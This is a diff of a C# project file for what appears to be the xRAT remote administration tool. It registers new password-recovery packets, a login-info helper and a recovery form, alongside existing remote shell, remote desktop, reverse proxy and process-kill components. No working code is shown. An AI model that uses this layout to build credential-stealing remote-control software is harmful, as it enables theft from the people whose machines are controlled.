@@ -93,6 +93,7 @@
     <Compile Include="Core\Packets\ClientPackets\GetStartupItemsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetSystemInfoResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\MonitorsResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\PasswordResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\ShellCommandResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\UserStatus.cs" />
     <Compile Include="Core\Packets\ClientPackets\Initialize.cs" />
@@ -115,6 +116,7 @@
     <Compile Include="Core\Packets\ServerPackets\KillProcess.cs" />
     <Compile Include="Core\Packets\ServerPackets\Monitors.cs" />
     <Compile Include="Core\Packets\ServerPackets\MouseClick.cs" />
+    <Compile Include="Core\Packets\ServerPackets\PasswordRequest.cs" />
     <Compile Include="Core\Packets\ServerPackets\RemoveStartupitem.cs" />
     <Compile Include="Core\Packets\ServerPackets\Rename.cs" />
     <Compile Include="Core\Packets\ServerPackets\ShellCommand.cs" />
@@ -212,6 +214,7 @@
     <Compile Include="Core\ProtoBuf\SubItemToken.cs" />
     <Compile Include="Core\ProtoBuf\WireType.cs" />
     <Compile Include="Core\Build\Renamer.cs" />
+    <Compile Include="Core\Recovery\Helper\LoginInfo.cs" />
     <Compile Include="Core\ReverseProxy\Packets\ReverseProxyConnect.cs" />
     <Compile Include="Core\ReverseProxy\Packets\ReverseProxyConnectResponse.cs" />
     <Compile Include="Core\ReverseProxy\Packets\ReverseProxyData.cs" />
@@ -266,6 +269,12 @@
     </Compile>
     <Compile Include="Controls\ListViewEx.cs">
       <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmPasswordRecovery.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmPasswordRecovery.Designer.cs">
+      <DependentUpon>FrmPasswordRecovery.cs</DependentUpon>
     </Compile>
     <Compile Include="Forms\FrmRemoteDesktop.cs">
       <SubType>Form</SubType>
@@ -370,6 +379,9 @@
     <EmbeddedResource Include="Forms\FrmMain.resx">
       <DependentUpon>FrmMain.cs</DependentUpon>
     </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmPasswordRecovery.resx">
+      <DependentUpon>FrmPasswordRecovery.cs</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Forms\FrmRemoteDesktop.resx">
       <DependentUpon>FrmRemoteDesktop.cs</DependentUpon>
     </EmbeddedResource>
@@ -431,6 +443,7 @@
     </Compile>
   </ItemGroup>
   <ItemGroup>
+    <None Include="images\save.png" />
     <Content Include="xRAT-64x64.ico" />
   </ItemGroup>
   <ItemGroup>
@@ -444,6 +457,7 @@
       <EmbedInteropTypes>True</EmbedInteropTypes>
     </COMReference>
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
        Other similar extension points exist, see Microsoft.Common.targets.
